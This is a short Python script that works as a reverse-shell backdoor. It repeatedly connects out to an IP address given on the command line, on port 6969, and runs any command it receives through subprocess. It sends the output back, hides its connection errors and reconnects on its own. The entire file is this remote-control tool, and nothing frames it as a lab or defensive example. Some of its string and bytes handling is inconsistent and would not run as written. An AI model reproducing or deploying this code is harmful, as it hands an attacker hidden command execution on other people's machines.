import subprocess
# Import socket module
import socket
# import sleep from time
from time import sleep
# import sys
import sys

ip = sys.argv[1]


def handlecommand(string):
    res = subprocess.check_output(string.split())
    return res


# Define the port on which you want to connect
port = 6969
running = True


def newconnection():
    global running
    while running:
        # connect to the server on local computer
        try:
            sleep(2)
            # print "trying to connect"
            # Create a socket object
            s = socket.socket()
            s.connect((ip, port))
            # print "connected"

            while True:
                # receive data from the server
                res = s.recv(1024)
                if res == "stopLoop":
                    running = False
                    s.sendall(b"Loop stopped")
                elif res == "restartLoop":
                    running = True
                    s.sendall(b"Loop restarted")
                elif res is 'exit':
                    break
                else:
                    try:
                        answ = "\n" + str(handlecommand(res)) + "\nDone, now listening\n"
                        s.sendall(bytes(answ))
                    except:
                        try:
                            s.sendall(b"Error")
                        except:
                            break

            # close the connection
            s.close()
            # print "disconnected"
            newconnection()
        except:
            pass


newconnection()
